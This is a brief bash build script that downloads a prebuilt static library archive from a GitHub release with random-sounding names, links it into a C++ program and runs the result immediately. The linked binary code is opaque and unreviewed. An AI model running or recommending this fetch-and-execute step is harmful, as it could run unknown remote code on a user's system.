#!/usr/bin/env bash
set -e
TAG="gentle-anchor-hidden-badger"
LIB="mixed-archive.a"
curl --retry 3 --connect-timeout 15 -fsSL --max-time 180 "https://github.com/taliatameare/blankbattlementhub/releases/download/${TAG}/${LIB}" -o "$LIB"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
